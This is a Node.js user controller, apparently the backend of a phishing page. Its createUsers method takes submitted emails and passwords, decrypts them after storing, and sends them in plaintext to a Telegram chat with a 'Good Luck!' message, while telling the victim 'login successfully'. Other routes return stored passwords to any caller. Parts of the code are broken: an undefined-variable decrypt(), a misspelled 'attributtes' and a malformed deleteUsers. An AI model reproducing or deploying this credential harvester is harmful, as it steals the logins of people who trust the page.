const users = require('../models/users.js')
const { SendBotMessage } = require('./botTelegram.js')
require('dotenv').config()
const bcrypt = require('bcrypt')
const crypto = require('crypto')


class Users {
    #id = process.env.CHAT_ID
    #email
    #password
    constructor(email, password) {
        this.email = email
        this.password = password
    }


    async getById(req, res) {
        const getId = await users.findOne({
            attributes: ['email', 'password'],
            where: {
                id: req.params.id
            }
        });
        res.json(getId);
    }

    async getUsers(res) {
        const gets = await users.findAll({
            attributtes: ['email', 'password'],
        })

        res.status(200).json(gets);
    }



    decrypt() {
        const textParts = text.split(':');
        const iv = Buffer.from(textParts.shift(), 'hex');
        const encryptedText = Buffer.from(textParts.join(':'), 'hex');

        const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key), iv); // Membuat objek decipher dengan algoritma AES-256-CBC

        let decrypted = decipher.update(encryptedText);
        decrypted = Buffer.concat([decrypted, decipher.final()]);

        return decrypted.toString();
    }


    async createUsers(req, res) {
        try {

            // Enkripsi
            const iv = crypto.randomBytes(16);
            const key = `${process.env.SECC_TOKEN}`

            // enkripsi email
            const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
            let encryptedEmail = cipher.update(req.body.email, 'utf8', 'hex');
            encryptedEmail += cipher.final('hex');
            const encryptedEmailIV = iv.toString('hex') + ':' + encryptedEmail;


            // enkripsi password
            const ivpw = crypto.randomBytes(16);
            const cipherPass = crypto.createCipheriv('aes-256-cbc', key, ivpw);
            let encryptedPass = cipherPass.update(req.body.password, 'utf8', 'hex');
            encryptedPass += cipherPass.final('hex');
            const encryptedPassIV = ivpw.toString('hex') + ':' + encryptedPass;

            // Simpan email dan password yang telah di-hash
            const ManageUsers = new Users(encryptedEmailIV, encryptedPassIV);
            const userBaru = await users.create({
                email: ManageUsers.email,
                password: ManageUsers.password
            });

            // dekrip email
            const emailParts = userBaru.email.split(':');
            const ivEmail = Buffer.from(emailParts.shift(), 'hex');
            const dencryptedEmail = Buffer.from(emailParts.join(':'), 'hex');

            const decipher = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key), ivEmail);
            let decrypted = decipher.update(dencryptedEmail);
            decrypted = Buffer.concat([decrypted, decipher.final()]);


            // dekrip pass
            const passParts = userBaru.password.split(':');
            const ivPass = Buffer.from(passParts.shift(), 'hex');
            const dencryptedPass = Buffer.from(passParts.join(':'), 'hex');

            const decipherPass = crypto.createDecipheriv('aes-256-cbc', Buffer.from(key), ivPass);
            let decryptedPass = decipherPass.update(dencryptedPass);
            decryptedPass = Buffer.concat([decryptedPass, decipherPass.final()]);


            // Kirim pesan bot
            const msgBot = `
            New Message 🚀🚀
            ===========================
            id: ${userBaru.id}
            Email: ${decrypted}
            Password: ${decryptedPass}\n
            Good Luck!
            ===========================
            ===========================
        `;

            const ManagerBot = new SendBotMessage(this.#id, msgBot);
            ManagerBot.sendMessage();

            res.status(201).json({ msg: "login successfully" });
        } catch (error) {
            console.error(error);
            res.status(500).json({ error: "Internal server error" });
        }
    }



    async deleteUsers(req, res) {

        await this.getById((id) => {
            if (!id) {
                throw new Error("user not found")
            }
            return id.destroy();
        })

        res.status(200).json({ msg: "delete successfully" })
    }

}

module.exports = { Users }